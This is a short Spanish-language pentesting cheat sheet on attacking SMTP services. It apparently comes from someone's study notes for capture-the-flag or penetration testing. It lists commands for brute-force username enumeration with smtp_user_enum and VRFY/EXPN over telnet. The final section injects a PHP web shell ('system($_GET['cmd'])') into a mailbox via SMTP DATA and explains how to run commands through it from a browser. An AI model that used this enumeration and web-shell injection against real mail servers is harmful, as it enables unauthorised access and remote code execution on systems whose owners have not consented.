# SMTP 

Tags: #SMTP

```bash 
❯ smtp_user_enum -M VRFY -U /usr/share/metasploit-framework/data/wordlist/unix_users.txt -t ❮IP❯ # Ataque de Fuerza bruta para identificar usuarios 

	# VRFY = Verificar una lista de usuarios 
	# U = Lista de usuarios 
```

```bash 
❯ telnet <IP> 25               # Conectarnos al servicio SMTP
	❯ HELP                    # Muestra los comandos a ingresar 
	❯ HELO test.com           # Mandar un saludo y ver la respuesta del servicio 
	❯ VRFY user               # Verificar si un usuario existe y poderlos enumerar
	❯ EXPN user               # Muestra la actual direccion de envio del alias 
	
	❯ MAIL FROM: root         # Primero definimos el remitente del mensaje
	❯ RCPT TO: Omar           # Define el destinatario de un mensaje

	❯ AUTH LOGIN              # Para autenticarte
		❯ YryRIwfui54        # Agregamos el usuario y el dominio 'administrator@test.com' en base64
		❯ Yonf6hU7Vop        # Colocamos la password en base64 

	❯ QUIT                    # Para salir de la sesion 
```

## Enviar código PHP 

```bash 
# Si el servidor SMTP no requiere autenticación puede ser vulnerable a envio de código PHP para obtener una Webshell  

❯ telnet <IP> 25               # Conectarnos al servicio SMTP

	❯ MAIL FROM: Admin        # Primero se define el remitente del mensaje
	❯ RCPT TO: Omar           # Definir el destinatario de un mensaje
	❯ DATA                    # Indica que se enviará data en el mensaje 
		❯ <?php system($_GET['cmd']);      # Data que se enviará. Nota: Terminar el comando de PHP '?>' 
		❯ .                  # El punto indica que se termina la data a enviar
	❯ QUIT                    # Salir 

Nota:
	1. La cmd se encontrará en la web '/var/mail/dir?cmd=whoami'
```